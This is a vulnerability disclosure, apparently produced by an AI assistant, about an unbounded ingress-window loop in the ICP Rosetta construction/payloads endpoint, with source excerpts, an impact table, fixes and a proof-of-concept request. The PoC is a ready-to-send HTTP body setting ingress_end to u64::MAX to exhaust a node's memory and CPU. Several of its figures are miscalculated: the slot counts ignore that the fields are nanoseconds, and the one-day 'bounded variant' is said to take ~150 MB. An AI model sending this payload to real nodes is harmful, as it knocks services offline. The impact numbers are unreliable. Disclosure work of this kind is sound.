Now I have all the data needed. Let me compute the exact numbers.

**Key facts:**
- `MAX_INGRESS_TTL` = 5 min = 300s; `PERMITTED_DRIFT` = 60s → `interval` = 300s − 60s − 120s = **120 seconds**
- The while loop at lines 99–107 runs `ceil((ingress_end − ingress_start) / interval)` times with **no upper bound check**
- The ICP Rosetta server applies a **4 MB JSON body limit** (line 298 of `rosetta_server.rs`) — this limits N (operations), but `ingress_start`/`ingress_end` are just two `u64` fields in the metadata object (negligible size)
- `add_payloads` pushes **2 `SigningPayload` objects per expiry slot per operation** — O(N × window/interval × 2) total heap allocations

---

### Title
Unbounded Ingress Window in `construction_payloads` Enables Memory/CPU Exhaustion of Rosetta Node — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

### Summary
The `/construction/payloads` endpoint accepts attacker-controlled `ingress_start` and `ingress_end` metadata fields with no validation of the window size. The server unconditionally builds a `Vec` of expiry slots spanning the entire window before processing any operations, then allocates two `SigningPayload` objects per slot per operation. A single unauthenticated HTTP request with `ingress_end = u64::MAX` causes the Rosetta node to loop ~150 billion times and exhaust all available memory and CPU.

### Finding Description

The `construction_payloads` handler reads `ingress_start` and `ingress_end` directly from the request metadata: [1](#0-0) 

It then builds `ingress_expiries` with a bare `while` loop, stepping by `interval` (120 s), with no cap on the number of iterations: [2](#0-1) 

`interval` is fixed at exactly 120 seconds: [3](#0-2) 

`MAX_INGRESS_TTL` = 300 s, `PERMITTED_DRIFT` = 60 s, so `interval` = 120 s: [4](#0-3) 

For every transaction in the operations list, `add_payloads` is called, which pushes **2 `SigningPayload` objects** per entry in `ingress_expiries`: [5](#0-4) 

The only server-side guard is a **4 MB JSON body limit** on the actix-web `JsonConfig`, which constrains N (the number of operations) but does nothing to bound the window size, since `ingress_start`/`ingress_end` are two `u64` fields occupying ~40 bytes: [6](#0-5) 

There is no rate limiting, concurrency cap, or window-size validation on this endpoint.

### Impact Explanation

| Parameter | Value |
|---|---|
| `interval` | 120 s |
| 24 h window | 86 400 / 120 = **720 slots** |
| 1 year window | 31 536 000 / 120 = **262 800 slots** |
| `ingress_end = u64::MAX` | ≈ **1.5 × 10¹¹ slots** → OOM + infinite loop |

With N = 1 operation and a 1-year window: 262 800 × 2 = 525 600 `SigningPayload` objects, each carrying a hex string and an `AccountIdentifier` clone — roughly 150–200 MB of heap. With `ingress_end = u64::MAX` the process never returns from the while loop, consuming all CPU and memory until the OS kills it.

### Likelihood Explanation

The `/construction/payloads` endpoint is unauthenticated and publicly reachable on any deployed ICP Rosetta node. The exploit requires a single HTTP POST with a crafted JSON body of under 1 KB. No credentials, no prior state, no privileged access needed.

### Recommendation

1. **Cap the ingress window** before the loop: reject or clamp requests where `ingress_end − ingress_start` exceeds `MAX_INGRESS_TTL` (or some small multiple, e.g. 24 h).
2. **Cap the `ingress_expiries` vector length** with an explicit `assert` or early return (e.g. `> 720` slots → error).
3. **Cap the operations count** in `operations_to_requests` independently of the body-size limit.
4. Apply the same fix to the ICRC-1 Rosetta `construction_payloads` in `rs/rosetta-api/icrc1/src/construction_api/services.rs`, which has an identical unbounded loop: [7](#0-6) 

### Proof of Concept

```http
POST /construction/payloads HTTP/1.1
Host: <rosetta-node>:8080
Content-Type: application/json

{
  "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
  "operations": [
    {"operation_identifier":{"index":0},"type":"STAKE",
     "account":{"address":"<valid-account>"},
     "metadata":{"neuron_index":0}}
  ],
  "public_keys": [{"hex_bytes":"<valid-pubkey>","curve_type":"edwards25519"}],
  "metadata": {
    "ingress_start": 0,
    "ingress_end": 18446744073709551615
  }
}
```

The server enters the `while now < ingress_end` loop and never exits. Peak RSS climbs until OOM. A bounded variant (e.g. `ingress_end − ingress_start = 86400 × 1e9`) allocates ~150 MB per request and is trivially parallelisable.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L1048-1076)
```rust
fn add_payloads(
    payloads: &mut Vec<SigningPayload>,
    ingress_expiries: &[u64],
    account_identifier: &AccountIdentifier,
    update: &HttpCanisterUpdate,
    signature_type: SignatureType,
) {
    for ingress_expiry in ingress_expiries {
        let mut update = update.clone();
        update.ingress_expiry = *ingress_expiry;
        let message_id = update.id();
        let transaction_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(transaction_payload);
        let read_state = make_read_state_from_update(&update);
        let read_state_message_id = MessageId::from(read_state.representation_independent_hash());
        let read_state_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&read_state_message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(read_state_payload);
    }
}
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L296-303)
```rust
                .app_data(web::Data::new(
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
                            errors::convert_to_error(&ApiError::invalid_request(format!("{e:#?}")))
                                .into()
                        }),
                ))
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L162-167)
```rust
    let mut ingress_expiries = vec![];
    while ingress_start < ingress_end {
        ingress_expiries.push(ingress_start + ingress_interval);
        ingress_start +=
            ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
    }
```
